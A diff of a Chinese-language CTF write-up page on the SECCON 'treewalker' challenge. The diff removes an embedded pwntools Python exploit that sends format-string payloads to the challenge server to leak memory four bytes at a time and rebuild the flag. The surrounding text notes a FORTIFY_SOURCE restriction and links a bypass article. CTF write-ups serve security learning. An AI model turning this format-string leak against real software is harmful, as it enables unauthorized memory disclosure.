@@ -306,56 +306,7 @@
 
 <p>我在比赛中用的 leak 一次只能 leak 一个字符，赛后重写改进了一下，能 leak 4 个字符，稍微加快一点。</p>
 
-<noscript><pre>#!/usr/bin/env python
-# coding=utf8
-
-from pwn import context, p64, process, remote
-from struct import unpack
-
-context.arch = 'amd64'
-
-# p = process('./treewalker')
-p = remote('treewalker.pwn.seccon.jp', 20000)
-
-leak_stack = p.recvline().strip()
-tree_addr = int(leak_stack, 16)
-print 'root: ' + hex(tree_addr)
-
-
-def leak(addr):
-    p.send(p64(0x1000))
-    fsb = '%x%x'*15 + 'A'*36 + 'ident%s\n'*4 + \
-        p64(addr) + p64(addr + 1) + p64(addr + 2) + p64(addr + 3)
-    p.send(fsb + '\x00' * (0x1000 - len(fsb)))
-
-    ret = []
-    for i in range(4):
-        p.recvuntil('ident')
-        r = p.recvline().strip('\n')
-        ret.append(r[0] if r else '\x00')
-    return ''.join(ret)
-
-flag = ''
-char = ''
-while True:
-    if not tree_addr:
-        break
-
-    leakoff8 = leak(tree_addr + 8)
-    if leakoff8 == '\x00'*4:
-        char += '0'
-        tree_addr = unpack('&lt;I', leak(tree_addr + 16))[0]
-    else:
-        char += '1'
-        tree_addr = unpack('&lt;I', leakoff8)[0]
-
-    if len(char) == 8:
-        flag += chr(int(char, 2))
-        print flag
-        char = ''
-
-p.send(p64(0))</pre></noscript>
-<div class="gist" data-gist="cubarco/a3ce8d93cb4860500090">Loading gist...</div>
+<div class="gist" data-gist="cubarco/a3ce8d93cb4860500090">Gist: cubarco/a3ce8d93cb4860500090</div>
 
 <p>一开始我准备用<code class="highlighter-rouge">"%31$s"</code>直接 printf, 但是会报<code class="highlighter-rouge">*** invalid %N$ use detected ***</code>. 这是由于 Glibc 的 FORTIFY_SOURCE, 可以绕过，具体方法看<a href="http://phrack.org/issues/67/9.html">这篇文章</a>。</p>
 
